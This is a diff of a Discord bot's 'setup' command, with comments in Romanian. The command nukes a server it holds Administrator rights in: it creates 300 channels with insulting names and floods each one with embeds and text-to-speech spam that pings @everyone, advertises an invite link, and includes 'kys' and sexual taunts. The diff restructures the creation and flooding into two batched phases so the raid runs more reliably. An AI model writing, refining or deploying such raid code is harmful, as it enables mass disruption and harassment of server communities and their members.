@@ -248,7 +248,6 @@ async def removepremium(ctx, user: discord.User):
 async def setup(ctx):
     guild = ctx.guild
     user = ctx.author
-    user_config = get_user_config(user.id)
 
     if not ctx.guild.me.guild_permissions.administrator:
         await ctx.send("❌ Botul nu are permisiunea de **Administrator**.")
@@ -291,7 +290,7 @@ async def setup(ctx):
         except:
             continue
 
-    # ===== LISTA NUME CANALE (actualizată) =====
+    # ===== LISTA NUME CANALE =====
     base_channel_names = [
         "1weeksober-king",
         "Cry-kid",
@@ -322,37 +321,14 @@ async def setup(ctx):
     spam_text = "corrupt own this mfs kys you js got n4ked https://discord.gg/larpempire @everyone @here"
     invite_text = "https://discord.gg/larpempire @everyone join"
 
-    # ===== SEMAFOR PENTRU LIMITAREA CONCURENȚEI =====
-    message_semaphore = asyncio.Semaphore(15)  # Maxim 15 canale simultan pentru trimitere mesaje
-
-    async def send_messages(channel):
-        async with message_semaphore:
-            try:
-                # 15 embed-uri
-                for _ in range(15):
-                    await channel.send(embed=embed_content)
-                # 50 de mesaje text
-                for _ in range(50):
-                    await channel.send(content=spam_text, tts=True)
-                # încă un embed
-                await channel.send(embed=embed_content)
-                # invitație
-                await channel.send(content=invite_text)
-            except Exception:
-                pass  # Ignorăm erorile
-
-    # ===== CREARE CANALE ȘI TRIMITERE MESAJE CONCURENT =====
+    # ===== FAZA 1: CREARE TOATE CANALELE =====
     total_channels = 300
-    created = 0
     font_styles = ["bold", "script", "double"]
+    created_channels = []
 
-    await user.send(f"🔄 Încep crearea a {total_channels} de canale și trimiterea mesajelor simultan...")
+    await user.send(f"🔄 Încep crearea a {total_channels} de canale...")
 
-    # Lista pentru a ține toate task-urile de trimitere
-    send_tasks = []
-
-    async def create_and_send(index):
-        nonlocal created
+    async def create_channel(index):
         try:
             base_name = random.choice(base_channel_names)
             font_style = random.choice(font_styles)
@@ -360,29 +336,56 @@ async def setup(ctx):
             if len(styled_name) > 100:
                 styled_name = base_name
             ch = await guild.create_text_channel(name=styled_name)
-            created += 1
-            # Creează task-ul de trimitere și îl adaugă în listă
-            task = asyncio.create_task(send_messages(ch))
-            send_tasks.append(task)
-            if created % 10 == 0:
-                await user.send(f"✅ Creat {created} canale până acum...")
+            return ch
         except Exception as e:
             await user.send(f"❌ Eroare la canalul {index}: {e}")
+            return None
 
-    # Executăm crearea în loturi de câte 20
+    # Creare în loturi de câte 20
     for i in range(0, total_channels, 20):
-        batch_tasks = [create_and_send(i+j) for j in range(20) if i+j < total_channels]
-        await asyncio.gather(*batch_tasks)
-        await asyncio.sleep(1)  # Pauză între loturi
+        batch = [create_channel(i+j) for j in range(20) if i+j < total_channels]
+        results = await asyncio.gather(*batch)
+        created_channels.extend([ch for ch in results if ch is not None])
+        await asyncio.sleep(1)
 
-    await user.send(f"✅ Toate canalele au fost create ({created}). Se așteaptă terminarea trimiterii mesajelor...")
+    await user.send(f"✅ Canale create: {len(created_channels)}. Încep trimiterea mesajelor...")
 
-    # Așteaptă finalizarea tuturor sarcinilor de trimitere
-    if send_tasks:
-        await asyncio.gather(*send_tasks)
+    # ===== FAZA 2: TRIMITERE MESAJE PE TOATE CANALELE =====
+    # Funcție care trimite mesaje pe un canal (alternând embed și text)
+    async def send_messages_to_channel(channel):
+        try:
+            # Trimite 15 perechi (embed + text) alternativ
+            for _ in range(15):
+                await channel.send(embed=embed_content)
+                await channel.send(content=spam_text, tts=True)
+            # După cele 15 perechi, mai trimite 35 de texte (pentru a ajunge la 50)
+            for _ in range(35):
+                await channel.send(content=spam_text, tts=True)
+            # Trimite invitația la final
+            await channel.send(content=invite_text)
+        except Exception:
+            pass  # Ignorăm erorile
+
+    # Trimite mesaje în loturi de câte 15 canale simultan
+    semaphore = asyncio.Semaphore(15)
+
+    async def send_with_semaphore(channel):
+        async with semaphore:
+            await send_messages_to_channel(channel)
+
+    # Creează toate task-urile de trimitere
+    send_tasks = [send_with_semaphore(ch) for ch in created_channels if ch]
+
+    # Execută task-urile în loturi de câte 15*5 = 75? Vom face un gather simplu pentru toate, dar cu semaforul deja limitează concurența la 15.
+    # Totuși, pentru a evita suprasolicitarea, le executăm în loturi de câte 50 de task-uri.
+    for i in range(0, len(send_tasks), 50):
+        batch = send_tasks[i:i+50]
+        await asyncio.gather(*batch)
+        await asyncio.sleep(1)
 
     await user.send("✅ Toate mesajele au fost trimise.")
 
+    # ===== CREARE ROL ȘI PĂRĂSIRE =====
     try:
         await guild.create_role(name="1weeksober-on-top")
     except:
